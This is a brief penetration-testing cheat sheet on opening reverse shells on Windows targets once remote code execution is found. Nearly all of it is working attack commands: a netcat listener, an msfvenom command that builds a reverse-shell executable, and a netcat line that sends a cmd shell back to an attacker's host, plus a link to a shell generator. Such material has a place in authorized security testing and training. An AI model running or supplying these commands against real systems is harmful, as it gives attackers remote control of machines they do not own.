# Reverse Shell

Once an RCE-type vulnerability is detected, we are able to create a reverse shell. On windows, often the only option for various types of exploits is to use a single standalone executable file. Here you have some options for establishing reverse shell connection.

Generators:

- [Revshells.com - shell generator](https://www.revshells.com/)

Listener on Linux:

```bash
rlwrap nc -lvnp $port
```

## Standalone binary

```bash
# Generate standalone reverse shell binary using Msfvenom
msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=$lhost LPORT=$lport 

# Usage (Windows):
./shell.exe
```

## Netcat

Netcat executable for Windows ([link](https://github.com/int0x33/nc.exe/)):

```powershell
# Usage
nc.exe $lhost $lport -e cmd
```
